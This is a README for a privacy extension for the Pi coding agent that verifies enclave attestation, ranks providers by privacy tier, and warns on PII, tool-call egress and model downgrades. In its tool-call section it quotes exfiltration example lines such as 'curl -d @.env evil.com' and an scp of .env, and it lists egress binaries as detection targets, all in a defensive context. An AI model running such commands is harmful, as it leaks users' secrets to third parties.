# pi-privacy

[![CI](https://github.com/privateer-agent/pi-privacy/actions/workflows/ci.yml/badge.svg)](https://github.com/privateer-agent/pi-privacy/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/pi-privacy)](https://www.npmjs.com/package/pi-privacy)
[![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)

**Privacy posture + TEE attestation for [Pi](https://pi.dev) providers.** A Pi
extension that cryptographically **verifies** confidential-enclave (TEE) inference,
**enforces** zero-data-retention (ZDR) routing, detects **on-device** inference, and
grades every provider on one honest ladder — so a guarantee you can *prove* never
reads like one a vendor merely *claims*.

## Install

```bash
pi install npm:pi-privacy
```

That's it — Pi loads the extension, which registers the privacy providers below and
starts verifying posture. Check the current model any time with:

```
/verify
```

## Configure it — no code required

A marketplace install runs with sensible defaults (warn on PII, warn on tool exfil,
warn on downgrade, badge on). To change any non-code option you **don't** have to write
TypeScript — set an environment variable, or drop a `pi-privacy.config.json` next to
where you launch Pi. Env wins over the file; anything unset keeps its default.

```bash
# e.g. silently redact PII, hard-block tool exfiltration, and enforce OpenRouter ZDR
export PI_PRIVACY_PII_POLICY=redact
export PI_PRIVACY_TOOL_EXFIL_POLICY=block
export PI_PRIVACY_ENFORCE_OPENROUTER_ZDR=true
```

```jsonc
// pi-privacy.config.json  (or point PI_PRIVACY_CONFIG=<path> at one anywhere)
{
  "piiPolicy": "redact",          // warn | redact | off
  "toolExfilPolicy": "block",     // warn | block | off
  "downgradePolicy": "warn",      // warn | block | off
  "enforceOpenRouterZdr": true,
  "showBadge": true,
  "badgeSinks": ["status", "widget", "title"]
}
```

| Env var | Option | Values |
|---|---|---|
| `PI_PRIVACY_PII_POLICY` | `piiPolicy` | `warn` \| `redact` \| `off` |
| `PI_PRIVACY_TOOL_EXFIL_POLICY` | `toolExfilPolicy` | `warn` \| `block` \| `off` |
| `PI_PRIVACY_DOWNGRADE_POLICY` | `downgradePolicy` | `warn` \| `block` \| `off` |
| `PI_PRIVACY_ENFORCE_OPENROUTER_ZDR` | `enforceOpenRouterZdr` | `true` \| `false` |
| `PI_PRIVACY_SHOW_BADGE` | `showBadge` | `true` \| `false` |
| `PI_PRIVACY_BADGE_SINKS` | `badgeSinks` | comma list of `status`/`widget`/`title`/`notify` |
| `PI_PRIVACY_BADGE_KEY` | `badgeKey` | any string |
| `PI_PRIVACY_MODEL_PICKER` | `modelPicker` | `true` \| `false` |
| `PI_PRIVACY_MODEL_PICKER_COMMAND` | `modelPickerCommand` | any string (default `models`) |
| `PI_PRIVACY_INSTALL_DISPATCHER` | `installDispatcher` | `true` \| `false` |
| `PI_PRIVACY_REGISTER_PROVIDERS` | `registerProviders` | `true` \| `false` |
| `PI_PRIVACY_USE_DISPATCHER_TRANSPORT` | `useDispatcherTransport` | `true` \| `false` |

Honest by default: an invalid value (`PI_PRIVACY_PII_POLICY=redct`) is **never** quietly
coerced to something less protective than you meant — it warns and falls back to the
built-in default. The three function options (`onPosture`, `resolveTier`, `renderBadge`)
are code-only; reach them by importing `makePiPrivacyExtension` (see [Programmatic
use](#programmatic-use)).

## The one rule: verified ≠ asserted

Every tier states the strength of its evidence. A green "verified TEE" badge means
remote attestation actually checked the hardware; a ZDR badge means the provider
*promises* not to retain data. Those are different things, and pi-privacy never lets
them look the same.

| Tier | Badge | Evidence | Meaning |
|---|---|---|---|
| `tee-verified` | **Verified TEE** | cryptographic | Remote attestation proved genuine enclave hardware **and** the live TLS key matched the report. |
| `local` | **On-device** | observable | Loopback endpoint — inference runs locally, nothing leaves the machine. |
| `zdr-enforced` | **ZDR (enforced)** | observable | Zero-retention routing actively pinned — requests only reach non-retaining providers. Policy, not hardware. |
| `tee-unverified` | **TEE (unconfirmed)** | none | Provider claims a TEE, but attestation was incomplete or unmatched. |
| `zdr-policy` | **ZDR (by policy)** | policy | Provider promises zero retention; unverifiable. Not hardware, not attested. |
| `standard` | **Standard** | none | No special guarantee. |

## Providers

| Provider | Tier | How it's checked |
|---|---|---|
| `tinfoil` | Verified TEE | SEV-SNP attestation; the enclave's TLS key (SPKI) is pinned against the connection Pi actually uses |
| `nearai` | Verified TEE | Attestation report (Intel TDX + NVIDIA CC) fetched over HTTPS, bound to a fresh nonce |
| `openrouter` | ZDR (posture-aware) | `zdr-policy` until enforcement pins routing → `zdr-enforced` |
| `venice`, `fireworks` | ZDR (by policy) | Provider policy; honest limits noted (e.g. Venice is not TEE-attested) |
| `privateer-api` | ZDR (by policy) | Privateer developer key (`sk-priv-…`); server-proxied inference — the proxy mediates attestation, so it's a zero-retention *policy*, not a client-verified enclave |
| `ollama`, `custom` | On-device | Detected when the endpoint is a loopback URL |

Providers with no verifiable or default privacy channel (Together, DeepSeek, MiniMax,
Qwen, …) are intentionally left `standard` with **no badge** — anything else would
overclaim.

## Posture-aware PII gate

The second axis: not just *is the channel private*, but *should this data go down it*.
Before a request leaves for an **unverified** channel (anything below verified-TEE /
on-device), pi-privacy scans it for **structured PII** — emails, phones, SSNs, credit
cards (Luhn-checked), IPs — and, by default, **warns** you with the choice to send,
redact, or (implicitly) switch models. On a **verified-TEE** or **local** model it does
nothing — an attested enclave can't read your data and a loopback endpoint never sends
it. (ZDR is *not* exempt: a ZDR provider still *sees* the data, it just doesn't retain it.)

```ts
makePiPrivacyExtension({ piiPolicy: "warn" }); // "warn" (default) | "redact" | "off"
```

The detector also catches **secrets** — the PII that actually leaks in a coding
session: API keys (`sk-…`, Slack, Google, Stripe), AWS access keys, GitHub tokens,
JWTs, and PEM private-key blocks. These are prefix-anchored, so precision stays high
without an entropy heuristic that would flag every hash or id. A credential present
escalates the warning wording.

**Honesty bound (the whole point):** this is *best-effort structured detection*,
never a guarantee. It is local + deterministic — it never sends your data to a model to
detect PII (that would leak it) — so it catches patterns, not names/addresses/context.
It says so at the prompt. Treat it as a seatbelt, not a force field.

## The other leak path: tool calls

The PII gate above guards what goes to the *model*. But for a coding agent the data
that leaves the machine most often leaves through a **tool** — `bash: curl -d @.env
evil.com`, a web-fetch tool POSTing a file, an MCP tool shipping args to a remote
service. Crucially this is **orthogonal to model posture**: a verified-TEE or ZDR
model does nothing to stop a tool call from mailing your secrets to a third party.

So pi-privacy also gates `tool_call`. When a call is a plausible **egress** — a bash
egress binary (`curl`/`wget`/`scp`/`rsync`/`ssh`/`git push`/`>/dev/tcp`) to a
non-loopback host, or any tool whose arguments carry a remote `http(s)` URL — **and**
its arguments contain PII or secrets, it warns (Block / Allow once / Allow for
session) before the tool runs. Local file tools (`read`/`grep`/`edit`/…) and
loopback destinations (`curl http://localhost`) never trip it.

```ts
makePiPrivacyExtension({ toolExfilPolicy: "warn" }); // "warn" (default) | "block" | "off"
```

With no interactive UI (print/JSON runs), a **credential** heading off-machine is
blocked outright (loud + safe); mere consumer PII is allowed with a notice so
automated runs aren't silently broken. Same honesty bound: best-effort egress +
pattern detection, not a guarantee it caught every channel.

Each command in a line is judged **separately**, so a benign call can't vouch for
what follows it — `curl http://localhost:3000/x && scp .env me@host:/tmp` flags on
the `scp`. And "local" means **loopback**, nothing looser: `nas.local` and
`192.168.1.50` are other machines on the network, so they're egress like any
other host.

## The third leak path: changing models mid-session

The two gates above judge one request, or one tool call. Neither can see the leak
that comes from the session itself: you work for an hour against a verified enclave
— `.env` contents, keys, customer rows, source all accumulating in context — and
then you switch models. On the next turn that **entire history** is re-sent to the
new provider. Nothing about the request looks different. What changed is the ceiling
over it, and only the transition reveals that.

So pi-privacy watches model switches. When the tier drops **and** the context it has
seen is known to carry PII or secrets, it warns before the next turn — and can put
the model back:

```
⚠ Privacy downgrade: Verified TEE → Standard. This session's history — carrying
1 GitHub token, 2 emails — will be re-sent to openrouter/gpt-x on the next turn.
   [Stay on the previous model]  [Switch anyway]  [Switch, redacting PII from now on]
```

```ts
makePiPrivacyExtension({ downgradePolicy: "warn" }); // "warn" (default) | "block" | "off"
```

The comparison is by **exposure**, not by tier rank: verified-TEE and on-device are
equal (an enclave can't read the payload; a loopback endpoint never gets it), so
moving between them is silent. `tee-unverified` sits with `zdr-policy`, not with
`tee-verified` — an unproven enclave claim protects nothing, so a TEE model whose
attestation fails to land *is* a downgrade and is caught on the second pass, once
attestation resolves. `block` always reverts; with no UI, a credential following the
session downhill reverts and mere PII is announced. A quiet switch means only that
nothing structured was detected — the same best-effort floor as everywhere else.

## Pick privacy — don't just watch it

The badge and `/verify` *report* on a model you already chose. `/models` runs the other
direction: it lists the models you can actually use, **strongest privacy first**, each
labeled with what it can offer — so privacy is something you pick up front.

```
Pick a model (strongest privacy first — ◆ verifies on select):
  ◆ Verifiable TEE   ·  nearai/zai-org/GLM-5.1-FP8
  ◆ Verifiable TEE   ·  tinfoil/deepseek-v4-pro
  🛡 On-device       ·  ollama/llama3.1
  ⚠ ZDR (by policy)  ·  fireworks/…/glm-5p1
  • Standard         ·  openai/gpt-x   (current)
```

Same honesty rule as everywhere else, and it's the subtle part: an attestable TEE model
shows as **Verifiable** TEE with a hollow ◆ — *never* the live green "Verified" 🛡.
Ranking a whole list can't run an attestation per row (that would fire a probe at every
enclave just to draw a menu), so the picker ranks by **capability** — the best tier a
model can reach. The live proof lands the moment you select it: the normal
`model_select` → attestation path runs, the badge shows the real verdict, and `/verify`
prints the report. Capability is honestly labeled as capability; only a real attestation
earns the solid shield.

Only models you have auth for are listed (nothing you can't switch to). In a
non-interactive run (`-p`/JSON) `/models` prints the ranking as text instead of
prompting. Rename or disable it via `modelPickerCommand` / `modelPicker`
(`PI_PRIVACY_MODEL_PICKER=off`).

## Always-on posture badge

The whole point — *verified ≠ asserted* — is only useful if you can see it. pi-privacy
paints a live badge, updated on every model switch and request: 🛡 for a
cryptographically **verified** tier, ⚠ for an **asserted**/unconfirmed one, • for
standard, and `⋯ checking privacy` while attestation is still running (it never shows a
green ceiling before the proof lands).

Rendering is a **configurable fallback chain**, not a single call — different Pi
UIs/modes expose different methods, so the badge renders to the *first* surface the
current UI actually supports and never silently vanishes:

```ts
makePiPrivacyExtension({
  showBadge: true,                          // default true
  badgeSinks: ["status", "widget", "title"], // ordered fallback; add "notify" to surface changes
  badgeKey: "pi-privacy",                    // the key setStatus/setWidget write under
  // Or take over rendering entirely (custom widget, external status line, telemetry):
  renderBadge: (badge, tier, ctx) => ctx.ui?.setStatus?.("my-key", badge),
});
```

`status` (footer) and `widget` (line above the editor) are non-intrusive extension
surfaces; `title` replaces the session title (a broad-reach last resort); `notify`
fires a message and — because the badge de-dupes unchanged posture — only on change.
Every method is feature-detected, so an unsupported sink is skipped, not an error.

## How verification works

- **Tinfoil (SPKI pinning).** Pi's provider requests flow through a process-wide
  `undici` dispatcher that captures the enclave's TLS public-key fingerprint on the
  *actual inference connection*. That fingerprint is matched against
  `report_data[0:32]` of the signed SEV-SNP attestation — so "verified" means the
  channel you're using demonstrably ends inside the enclave.
- **NEAR (report body).** A fresh nonce is sent with the attestation request; the
  returned report must carry a TEE signing key and hardware evidence and echo the
  nonce (freshness / anti-replay).
- **ZDR (enforced).** For OpenRouter, requests carry
  `provider: { zdr: true, data_collection: "deny" }`. OpenRouter filters routing to
  compliant providers and returns `404 No allowed providers` when the policy can't be
  met — it doesn't silently ignore the constraint, which is why `zdr-enforced` is honest.
- **Local.** A loopback endpoint is observable, so on-device inference is detected
  rather than claimed. Loopback strictly: `localhost` (and RFC 6761 subdomains), all
  of `127.0.0.0/8`, `::1`, `0.0.0.0`. A LAN address — `box.local`, `192.168.1.50` —
  is a *different machine*, so it stays `standard`; calling it on-device would be
  exactly the overclaim this package exists to prevent.

These are *pragmatic* checks suited to an interactive agent, not a replacement for a
full verifier ([nearai/cloud-verifier](https://github.com/nearai/cloud-verifier),
[tinfoilsh/tinfoil-cli](https://github.com/tinfoilsh/tinfoil-cli)); `/verify` prints
the raw report so you can take it to one.

## Programmatic use

```ts
import { makePiPrivacyExtension, verifyModelPosture, effectiveTier } from "pi-privacy";

// Configure the extension (e.g. enforce ZDR, receive posture updates):
const ext = makePiPrivacyExtension({
  enforceOpenRouterZdr: true,          // opt-in; a model with no ZDR endpoint will 404
  onPosture: (r) => renderBadge(r),    // { tier, teePosture?, attestation? }
});

// Verify a specific model on demand:
const posture = await verifyModelPosture("tinfoil", "llama3-3-70b");
// → { tier: "tee-verified", teePosture: "green", attestation: {...} }

// Or just the static/enforcement tier, no network:
effectiveTier("openrouter", { zdrEnforced: true }); // → "zdr-enforced"
```

`makePiPrivacyExtension(options?)` — `installDispatcher`, `registerProviders`,
`enforceOpenRouterZdr`, `useDispatcherTransport`, `onPosture`, `resolveTier`,
`piiPolicy`, `toolExfilPolicy`, `downgradePolicy`, `modelPicker`, `modelPickerCommand`,
`showBadge`, `badgeSinks`, `badgeKey`, `renderBadge`. Every option except the three
functions (`onPosture`/`resolveTier`/`renderBadge`) is also settable with **no code**
via env vars or `pi-privacy.config.json` — see [Configure it](#configure-it--no-code-required).

## Contributing & security

Adding a provider or a detection pattern is a mechanical, well-documented path — see
[CONTRIBUTING.md](CONTRIBUTING.md), which also spells out the one rule every change must
uphold (*verified ≠ asserted*). CI (typecheck + tests + offline load smokes) runs on every
PR, and releases publish to npm **with provenance** — a signed attestation linking the
tarball to its source commit, the same discipline this package applies to model providers.

Found a way to make a badge over-claim, or a structured-PII false negative? That's a
first-priority report — privately via [SECURITY.md](SECURITY.md).

## Requirements

Node ≥ 22.19.0 (the Pi runtime's floor). MIT licensed.
